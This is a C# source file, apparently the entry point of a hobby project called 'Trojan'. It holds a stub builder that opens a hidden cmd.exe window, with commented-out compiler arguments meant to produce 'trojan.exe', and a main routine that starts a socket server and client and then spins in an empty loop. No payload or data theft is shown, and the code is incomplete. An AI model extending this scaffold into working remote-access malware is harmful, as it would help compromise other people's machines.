using System;
using System.Diagnostics;
using Trojan.server;
using Trojan.client;
using SocketData;

namespace Trojan
{
    public class TrojanBaseClass
    {
        static internal void BuildTrojanStub()
        {
            Process new_process = new Process();
            ProcessStartInfo new_processStartInfo = new_process.StartInfo;

            new_processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            new_processStartInfo.FileName = "cmd.exe";
            //new_processStartInfo.Arguments = "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/csc.exe /reference:"bin / Debug / net6.0 / Trojan.dll" /reference:"C:/ Windows / Microsoft.NET / Framework64 / v4.0.30319 / System.Runtime.dll" /reference:"C:/ Windows / Microsoft.NET / Framework64 / v4.0.30319 / System.Net.Primitives.dll" -out:TrojanBuild/trojan.exe client\client.cs";

            new_process.StartInfo = new_processStartInfo;
            new_process.Start();

            new_process.WaitForExit();
            new_process.Close();
        }

        public Server server = new Server();
        public Client client = new Client();

        static async Task Main()
        {
            TrojanBaseClass TrojanBase = new TrojanBaseClass();

            TrojanBase.server.Init_Server(SocketHandler.PORT, SocketHandler.BUFFSIZE);
            await TrojanBase.client.Init_Client(SocketHandler.PORT, SocketHandler.BUFFSIZE);

            while(true)
            {
 
            }
        }
    }
}
